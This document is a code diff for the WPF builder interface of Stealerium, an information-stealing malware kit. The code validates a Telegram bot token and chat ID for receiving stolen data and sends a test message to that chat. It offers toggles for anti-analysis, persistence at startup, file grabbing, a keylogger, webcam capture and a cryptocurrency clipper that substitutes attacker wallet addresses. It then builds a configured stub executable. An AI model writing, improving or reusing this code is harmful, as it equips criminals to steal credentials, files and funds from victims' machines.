@@ -1,8 +1,10 @@
-﻿using System.IO;
+using System.IO;
 using System.Net.Http;
 using System.Windows;
 using System.Windows.Controls;
 using Microsoft.Win32;
+using System.Windows.Media;
+using Wpf.Ui.Controls;
 
 namespace Stealerium.Builder
 {
@@ -17,27 +19,51 @@ namespace Stealerium.Builder
         {
             InitializeComponent();
             CheckStubFile();
+            InitializeUI();
+        }
+
+        private void InitializeUI()
+        {
+            // Set initial states
+            WebhookStatusLabel.IsOpen = false;
+            ApiTokenTextBox.PlaceholderText = "Enter your Telegram bot API token";
+            ChatIdTextBox.PlaceholderText = "Enter your Telegram chat ID";
+
+            // Set tooltips for better UX
+            DebugCheckBox.ToolTip = "Enable detailed error logging to a file";
+            AntiAnalysisCheckBox.ToolTip = "Implement anti-analysis measures";
+            StartDelayCheckBox.ToolTip = "Add random delay on startup";
+            GrabberCheckBox.ToolTip = "Enable file grabbing functionality";
+            StartupCheckBox.ToolTip = "Install the application to run on system startup";
+            
+            // Set initial button states
+            TestTelegramButton.IsEnabled = false;
+            BuildButton.IsEnabled = false;
+
+            // Initialize advanced options as disabled
+            WebcamScreenshotCheckBox.IsEnabled = false;
+            KeyloggerCheckBox.IsEnabled = false;
+            ClipperCheckBox.IsEnabled = false;
         }
 
         private void CheckStubFile()
         {
-            // Assume stub.exe is in the "Stub" folder relative to the application's directory
             stubPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Stub", "stub.exe");
 
             if (File.Exists(stubPath))
             {
-                StubStatusLabel.Severity = Wpf.Ui.Controls.InfoBarSeverity.Success;
-                StubStatusLabel.Title = "Stub Detected";
-                StubStatusLabel.Message = $"Stub detected at: {stubPath}";
+                StubStatusLabel.Title = "Stub Status";
+                StubStatusLabel.Message = "Stub detected successfully";
+                StubStatusLabel.Severity = InfoBarSeverity.Success;
                 StubStatusLabel.IsOpen = true;
                 StubStatusLabel.IsClosable = false;
                 isStubDetected = true;
             }
             else
             {
-                StubStatusLabel.Severity = Wpf.Ui.Controls.InfoBarSeverity.Error;
-                StubStatusLabel.Title = "Stub Not Found";
-                StubStatusLabel.Message = "stub.exe not found! Please place it in the 'Stub' folder.";
+                StubStatusLabel.Title = "Stub Status";
+                StubStatusLabel.Message = "Stub not found! Please place stub.exe in the 'Stub' folder.";
+                StubStatusLabel.Severity = InfoBarSeverity.Error;
                 StubStatusLabel.IsOpen = true;
                 StubStatusLabel.IsClosable = false;
                 isStubDetected = false;
@@ -48,33 +74,44 @@ namespace Stealerium.Builder
 
         private void UpdateBuildButtonState()
         {
-            // Enable BuildButton only if both the stub is detected and both API token and chat ID are valid
             BuildButton.IsEnabled = isStubDetected && isApiTokenValid && isChatIdValid;
+            BuildButton.Appearance = BuildButton.IsEnabled ? Wpf.Ui.Controls.ControlAppearance.Success : Wpf.Ui.Controls.ControlAppearance.Secondary;
         }
 
         private async void ApiTokenTextBox_TextChanged(object sender, TextChangedEventArgs e)
         {
             var token = ApiTokenTextBox.Text.Trim();
+            TestTelegramButton.IsEnabled = !string.IsNullOrEmpty(token) && !string.IsNullOrEmpty(ChatIdTextBox.Text.Trim());
 
-            // Show the LoadingOverlay while validating
-            LoadingOverlay.Visibility = Visibility.Visible;
-
-            if (!string.IsNullOrEmpty(token))
+            if (string.IsNullOrEmpty(token))
             {
-                isApiTokenValid = await Telegram.TokenIsValidAsync(token);  // Asynchronously validate the token
-                WebhookStatusLabel.Message = isApiTokenValid ? "Telegram API token is valid." : "Invalid Telegram API token!";
-                WebhookStatusLabel.Severity = isApiTokenValid ? Wpf.Ui.Controls.InfoBarSeverity.Success : Wpf.Ui.Controls.InfoBarSeverity.Error;
+                isApiTokenValid = false;
+                WebhookStatusLabel.Title = "Validation Error";
+                WebhookStatusLabel.Message = "Telegram API token cannot be empty";
+                WebhookStatusLabel.Severity = InfoBarSeverity.Warning;
+                WebhookStatusLabel.IsOpen = true;
+                UpdateBuildButtonState();
+                return;
+            }
+
+            LoadingOverlay.Visibility = Visibility.Visible;
+            isApiTokenValid = await Telegram.TokenIsValidAsync(token);
+            
+            if (isApiTokenValid)
+            {
+                WebhookStatusLabel.Title = "Validation Success";
+                WebhookStatusLabel.Message = "Telegram API token is valid";
+                WebhookStatusLabel.Severity = InfoBarSeverity.Success;
             }
             else
             {
-                isApiTokenValid = false;
-                WebhookStatusLabel.Message = "Telegram API token cannot be empty.";
-                WebhookStatusLabel.Severity = Wpf.Ui.Controls.InfoBarSeverity.Error;
+                WebhookStatusLabel.Title = "Validation Error";
+                WebhookStatusLabel.Message = "Invalid Telegram API token";
+                WebhookStatusLabel.Severity = InfoBarSeverity.Error;
             }
-
-            // Hide the LoadingOverlay after validation
+            
+            WebhookStatusLabel.IsOpen = true;
             LoadingOverlay.Visibility = Visibility.Collapsed;
-
             UpdateBuildButtonState();
         }
 
@@ -82,135 +119,132 @@ namespace Stealerium.Builder
         {
             var token = ApiTokenTextBox.Text.Trim();
             var chatId = ChatIdTextBox.Text.Trim();
+            TestTelegramButton.IsEnabled = !string.IsNullOrEmpty(token) && !string.IsNullOrEmpty(chatId);
 
-            // Show the LoadingOverlay while validating
-            LoadingOverlay.Visibility = Visibility.Visible;
-
-            if (!string.IsNullOrEmpty(chatId) && !string.IsNullOrEmpty(token))
+            if (string.IsNullOrEmpty(chatId))
             {
-                // Attempt to send a test message with the provided Chat ID to validate
-                isChatIdValid = await ValidateChatIdAsync(token, chatId);
+                isChatIdValid = false;
+                WebhookStatusLabel.Title = "Validation Error";
+                WebhookStatusLabel.Message = "Telegram chat ID cannot be empty";
+                WebhookStatusLabel.Severity = InfoBarSeverity.Warning;
+                WebhookStatusLabel.IsOpen = true;
+                UpdateBuildButtonState();
+                return;
+            }
 
-                if (isChatIdValid)
-                {
-                    WebhookStatusLabel.Message = "Telegram Chat ID is valid.";
-                    WebhookStatusLabel.Severity = Wpf.Ui.Controls.InfoBarSeverity.Success;
-                }
-                else
-                {
-                    WebhookStatusLabel.Message = "Invalid Telegram Chat ID.";
-                    WebhookStatusLabel.Severity = Wpf.Ui.Controls.InfoBarSeverity.Error;
-                }
+            if (string.IsNullOrEmpty(token))
+            {
+                WebhookStatusLabel.Title = "Validation Error";
+                WebhookStatusLabel.Message = "Please enter a Telegram API token first";
+                WebhookStatusLabel.Severity = InfoBarSeverity.Warning;
+                WebhookStatusLabel.IsOpen = true;
+                return;
+            }
+
+            LoadingOverlay.Visibility = Visibility.Visible;
+            isChatIdValid = await ValidateChatIdAsync(token, chatId);
+            
+            if (isChatIdValid)
+            {
+                WebhookStatusLabel.Title = "Validation Success";
+                WebhookStatusLabel.Message = "Telegram chat ID is valid";
+                WebhookStatusLabel.Severity = InfoBarSeverity.Success;
             }
             else
             {
-                isChatIdValid = false;
-                WebhookStatusLabel.Message = "Telegram Chat ID cannot be empty.";
-                WebhookStatusLabel.Severity = Wpf.Ui.Controls.InfoBarSeverity.Error;
+                WebhookStatusLabel.Title = "Validation Error";
+                WebhookStatusLabel.Message = "Invalid Telegram chat ID";
+                WebhookStatusLabel.Severity = InfoBarSeverity.Error;
             }
-
-            // Hide the LoadingOverlay after validation
+            
+            WebhookStatusLabel.IsOpen = true;
             LoadingOverlay.Visibility = Visibility.Collapsed;
-
             UpdateBuildButtonState();
         }
 
-
-        // Helper method to validate Chat ID by sending a test message
         private async Task<bool> ValidateChatIdAsync(string token, string chatId)
         {
             try
             {
-                string testMessage = "Validating chat ID";
+                string testMessage = "Validating chat ID...";
                 string telegramApiUrl = $"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatId}&text={Uri.EscapeDataString(testMessage)}";
 
                 using (HttpClient client = new HttpClient())
                 {
                     HttpResponseMessage response = await client.GetAsync(telegramApiUrl);
-
-                    // If the response status code is 200, the Chat ID is valid
                     return response.IsSuccessStatusCode;
                 }
             }
-            catch (Exception ex)
+            catch (Exception)
             {
-                // Log any exceptions, if needed
-                Console.WriteLine("Validation failed: " + ex.Message);
                 return false;
             }
         }
 
         private async void TestTelegramButton_Click(object sender, RoutedEventArgs e)
         {
-            var token = ApiTokenTextBox.Text.Trim();  // Get the Telegram bot token from the text box
-            var chatId = ChatIdTextBox.Text.Trim();   // Get the Telegram chat ID from the text box
+            var token = ApiTokenTextBox.Text.Trim();
+            var chatId = ChatIdTextBox.Text.Trim();
 
-            if (string.IsNullOrEmpty(token))
+            if (string.IsNullOrEmpty(token) || string.IsNullOrEmpty(chatId))
             {
-                var uiMessageBox = new Wpf.Ui.Controls.MessageBox
+                var messageBox = new Wpf.Ui.Controls.MessageBox
                 {
-                    Title = "Error",
-                    Content = "Telegram bot API token cannot be empty.",
+                    Title = "Validation Error",
+                    Content = "Please enter both Telegram API token and chat ID."
                 };
-                _ = await uiMessageBox.ShowDialogAsync();
-                return;
-            }
-
-            if (string.IsNullOrEmpty(chatId))
-            {
-                var uiMessageBox = new Wpf.Ui.Controls.MessageBox
-                {
-                    Title = "Error",
-                    Content = "Telegram chat ID cannot be empty.",
-                };
-                _ = await uiMessageBox.ShowDialogAsync();
+                await messageBox.ShowDialogAsync();
                 return;
             }
 
             TestTelegramButton.IsEnabled = false;
-            WebhookStatusLabel.Message = "Testing Telegram connection...";
-            WebhookStatusLabel.Severity = Wpf.Ui.Controls.InfoBarSeverity.Informational;
-            WebhookStatusLabel.IsOpen = true;
+            LoadingOverlay.Visibility = Visibility.Visible;
 
-            // Check if the Telegram API token is valid
             bool isTokenValid = await Telegram.TokenIsValidAsync(token);
-
             if (!isTokenValid)
             {
-                WebhookStatusLabel.Message = "Invalid Telegram bot API token!";
-                WebhookStatusLabel.Severity = Wpf.Ui.Controls.InfoBarSeverity.Error;
+                WebhookStatusLabel.Title = "Connection Error";
+                WebhookStatusLabel.Message = "Invalid Telegram API token";
+                WebhookStatusLabel.Severity = InfoBarSeverity.Error;
+                WebhookStatusLabel.IsOpen = true;
             }
             else
             {
-                // Send a test message to the chat
                 int messageId = await Telegram.SendMessageAsync("✅ *Stealerium* builder connected successfully!", token, chatId);
-                bool messageSent = messageId > 0;
-
-                if (messageSent)
+                if (messageId > 0)
                 {
-                    WebhookStatusLabel.Message = "Connected successfully!";
-                    WebhookStatusLabel.Severity = Wpf.Ui.Controls.InfoBarSeverity.Success;
+                    WebhookStatusLabel.Title = "Connection Success";
+                    WebhookStatusLabel.Message = "Connected to Telegram successfully!";
+                    WebhookStatusLabel.Severity = InfoBarSeverity.Success;
                 }
                 else
                 {
-                    WebhookStatusLabel.Message = "Failed to send test message.";
-                    WebhookStatusLabel.Severity = Wpf.Ui.Controls.InfoBarSeverity.Error;
-                    isTokenValid = false; // Consider the token invalid if the message fails
+                    WebhookStatusLabel.Title = "Connection Error";
+                    WebhookStatusLabel.Message = "Failed to send test message";
+                    WebhookStatusLabel.Severity = InfoBarSeverity.Error;
                 }
             }
 
-            UpdateBuildButtonState();
+            LoadingOverlay.Visibility = Visibility.Collapsed;
             TestTelegramButton.IsEnabled = true;
+            UpdateBuildButtonState();
         }
 
         private void StartupCheckBox_Checked(object sender, RoutedEventArgs e)
         {
-            StartupOptionsPanel.Visibility = Visibility.Visible;
+            WebcamScreenshotCheckBox.IsEnabled = true;
+            KeyloggerCheckBox.IsEnabled = true;
+            ClipperCheckBox.IsEnabled = true;
         }
 
         private void StartupCheckBox_Unchecked(object sender, RoutedEventArgs e)
         {
-            StartupOptionsPanel.Visibility = Visibility.Collapsed;
+            WebcamScreenshotCheckBox.IsEnabled = false;
+            WebcamScreenshotCheckBox.IsChecked = false;
+            KeyloggerCheckBox.IsEnabled = false;
+            KeyloggerCheckBox.IsChecked = false;
+            ClipperCheckBox.IsEnabled = false;
+            ClipperCheckBox.IsChecked = false;
         }
 
         private void ClipperCheckBox_Checked(object sender, RoutedEventArgs e)
@@ -221,38 +255,29 @@ namespace Stealerium.Builder
         private void ClipperCheckBox_Unchecked(object sender, RoutedEventArgs e)
         {
             ClipperAddressesPanel.Visibility = Visibility.Collapsed;
+            ClipperBTCTextBox.Text = string.Empty;
+            ClipperETHTextBox.Text = string.Empty;
+            ClipperLTCTextBox.Text = string.Empty;
         }
 
-        private void BuildButton_Click(object sender, RoutedEventArgs e)
+        private async void BuildButton_Click(object sender, RoutedEventArgs e)
         {
-            BuildStub();
+            await BuildStub();
         }
 
-        private void BuildStub()
+        private async Task BuildStub()
         {
-            // Collect and validate inputs
             var token = ApiTokenTextBox.Text.Trim();
             var chatId = ChatIdTextBox.Text.Trim();
 
-            if (string.IsNullOrEmpty(token))
+            if (string.IsNullOrEmpty(token) || string.IsNullOrEmpty(chatId))
             {
-                var uiMessageBox = new Wpf.Ui.Controls.MessageBox
+                var messageBox = new Wpf.Ui.Controls.MessageBox
                 {
-                    Title = "Error",
-                    Content = "Telegram bot API token cannot be empty.",
+                    Title = "Build Error",
+                    Content = "Please enter both Telegram API token and chat ID."
                 };
-                _ = uiMessageBox.ShowDialogAsync();
-                return;
-            }
-
-            if (string.IsNullOrEmpty(chatId))
-            {
-                var uiMessageBox = new Wpf.Ui.Controls.MessageBox
-                {
-                    Title = "Error",
-                    Content = "Telegram chat ID cannot be empty.",
-                };
-                _ = uiMessageBox.ShowDialogAsync();
+                await messageBox.ShowDialogAsync();
                 return;
             }
 
@@ -280,6 +305,19 @@ namespace Stealerium.Builder
 
             if (Build.ConfigValues["Clipper"] == "1")
             {
+                if (string.IsNullOrWhiteSpace(ClipperBTCTextBox.Text) && 
+                    string.IsNullOrWhiteSpace(ClipperETHTextBox.Text) && 
+                    string.IsNullOrWhiteSpace(ClipperLTCTextBox.Text))
+                {
+                    var messageBox = new Wpf.Ui.Controls.MessageBox
+                    {
+                        Title = "Build Error",
+                        Content = "Please enter at least one cryptocurrency address for the clipper."
+                    };
+                    await messageBox.ShowDialogAsync();
+                    return;
+                }
+
                 Build.ConfigValues["ClipperBTC"] = Crypt.EncryptConfig(ClipperBTCTextBox.Text.Trim());
                 Build.ConfigValues["ClipperETH"] = Crypt.EncryptConfig(ClipperETHTextBox.Text.Trim());
                 Build.ConfigValues["ClipperLTC"] = Crypt.EncryptConfig(ClipperLTCTextBox.Text.Trim());
@@ -291,7 +329,6 @@ namespace Stealerium.Builder
                 Build.ConfigValues["ClipperLTC"] = "";
             }
 
-            // Prompt the user to select the output file location
             SaveFileDialog saveFileDialog = new SaveFileDialog
             {
                 Title = "Save Built Stub",
@@ -303,20 +340,39 @@ namespace Stealerium.Builder
             {
                 try
                 {
+                    LoadingOverlay.Visibility = Visibility.Visible;
                     var buildPath = Build.BuildStub(saveFileDialog.FileName, stubPath);
-                    BuildStatusLabel.Text = $"Stub built successfully: {buildPath}";
-                    BuildStatusLabel.Foreground = System.Windows.Media.Brushes.Green;
+                    BuildStatusLabel.Text = $"Build successful: {buildPath}";
+                    BuildStatusLabel.Foreground = new SolidColorBrush(Colors.Green);
+                    
+                    var messageBox = new Wpf.Ui.Controls.MessageBox
+                    {
+                        Title = "Build Success",
+                        Content = $"Stub built successfully and saved to:\n{buildPath}"
+                    };
+                    await messageBox.ShowDialogAsync();
                 }
                 catch (Exception ex)
                 {
                     BuildStatusLabel.Text = $"Build failed: {ex.Message}";
-                    BuildStatusLabel.Foreground = System.Windows.Media.Brushes.Red;
+                    BuildStatusLabel.Foreground = new SolidColorBrush(Colors.Red);
+                    
+                    var messageBox = new Wpf.Ui.Controls.MessageBox
+                    {
+                        Title = "Build Error",
+                        Content = $"Failed to build stub:\n{ex.Message}"
+                    };
+                    await messageBox.ShowDialogAsync();
+                }
+                finally
+                {
+                    LoadingOverlay.Visibility = Visibility.Collapsed;
                 }
             }
             else
             {
-                BuildStatusLabel.Text = "Build cancelled by user.";
-                BuildStatusLabel.Foreground = System.Windows.Media.Brushes.Gray;
+                BuildStatusLabel.Text = "Build cancelled";
+                BuildStatusLabel.Foreground = new SolidColorBrush(Colors.Gray);
             }
         }
     }
